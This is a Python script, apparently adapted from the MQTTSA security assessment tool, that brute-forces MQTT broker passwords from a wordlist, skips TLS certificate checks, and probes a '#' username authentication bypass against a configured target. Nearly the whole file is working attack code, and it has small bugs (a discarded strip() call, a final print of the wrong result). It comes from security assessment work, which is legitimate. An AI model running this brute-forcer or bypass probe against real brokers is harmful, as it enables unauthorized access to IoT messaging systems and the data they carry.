"""
This is a method in MQTTSA, but it is not compatible with the latest version of paho. I have adapted/upgraded it to the
new version of paho here, but the principle is no different from that in MQTTSA
MQTTSA PAPER:https://www.researchgate.net/publication/341563324_SlowITe_a_Novel_Denial_of_Service_Attack_Affecting_MQTT
MQTTSA GITHUB:https://github.com/stfbk/mqttsa
MQTTSA OFFICIAL WEBSITE:https://sites.google.com/fbk.eu/mqttsa/home
"""
import paho.mqtt.client as mqtt
import ssl
import time

import CONST
from learn import randomIP

ip_target_const = CONST.IP_ADDRESS
port_const = CONST.DST_PORT
version_const = mqtt.CallbackAPIVersion.VERSION2


def on_connect_3(client, userdata, flags, rc):
    """
    For MQTT v3.1 and v3.1.1 it's::
    :param client: the client instance for this callback
    :param userdata: the private user data as set in Client() or user_data_set()
    :param flags: the flags for this connection
    :param rc: the connection reason code received from the broken.
    :return:
    """
    print(f'on_connect_3 => \nclient.connected = <{client.is_connected()}>')
    print(f'userdata = <{userdata}>')
    print(f'flags = <{flags}>')
    print(f'rc = <{rc}>')


def on_connect_5(client, userdata, flags, reason_code, properties):
    print(f'on_connect_5 => \nclient.connected = <{client.is_connected()}>')
    print(f'userdata = <{userdata}>')
    print(f'flags = <{flags}>')
    print(f'reason_code = <{reason_code}>')
    print(f'properties = <{properties}>')


def brute_force(
        ip_target, version, port, username, wordlist_path, tls_cert=None, client_cert=None, client_key=None
):
    with open(wordlist_path) as f:
        for line in f:
            try:
                password = line[:-1]
                password.strip()
                client = mqtt.Client(
                    callback_api_version=version,
                    protocol=mqtt.MQTTv5 if version == mqtt.CallbackAPIVersion.VERSION2 else mqtt.MQTTv311
                )

                client.on_connect = on_connect_5 if version == mqtt.CallbackAPIVersion.VERSION2 else on_connect_3
                client.username_pw_set(username=username, password=password)
                print('client.username_pw_set trying: ' + username + ', ' + password)

                if tls_cert is not None:
                    client.tls_set(tls_cert, client_cert, client_key, cert_reqs=ssl.CERT_NONE,
                                   tls_version=ssl.PROTOCOL_TLS, ciphers=None)
                    client.tls_insecure_set(True)
                client.connect(ip_target, port)
                client.loop_start()
                time.sleep(1)
                if client.is_connected():
                    client.disconnect()
                    return [True, password]
            except KeyboardInterrupt:
                return [False, ""]
            except:
                continue
    return [False, ""]


def username_bug(ip_target, version, port, tls_cert=None, client_cert=None, client_key=None):
    client = mqtt.Client(
        callback_api_version=version,
        protocol=mqtt.MQTTv5 if version == mqtt.CallbackAPIVersion.VERSION2 else mqtt.MQTTv311
    )
    client.on_connect = on_connect_5 if version == mqtt.CallbackAPIVersion.VERSION2 else on_connect_3
    client.username_pw_set('#', '')
    print('client.username_pw_set trying: ' + '#')

    try:
        # if the tls_cert value is different from None, try to connect over TLS
        if tls_cert is not None:
            client.tls_set(tls_cert, client_cert, client_key, cert_reqs=ssl.CERT_NONE, tls_version=ssl.PROTOCOL_TLS,
                           ciphers=None)
            client.tls_insecure_set(True)
        client.connect(ip_target, port)
        client.loop_start()
        time.sleep(1)
        client.loop_stop()
        # if we are able to connect, we break the loop and we return the list of passwords and
        # if each password was working or not
    except:
        pass

    if client.is_connected():
        return True
    else:
        return False


if __name__ == '__main__':
    bruteforce_results = brute_force(
        ip_target=ip_target_const,
        version=version_const,
        port=port_const,
        username=randomIP.RANDOM_NAME(suffix='', randomLen=6),
        wordlist_path='./words.txt',
    )
    print(bruteforce_results)
    username_bug_results = username_bug(
        ip_target=ip_target_const,
        version=version_const,
        port=port_const
    )
    print(bruteforce_results)
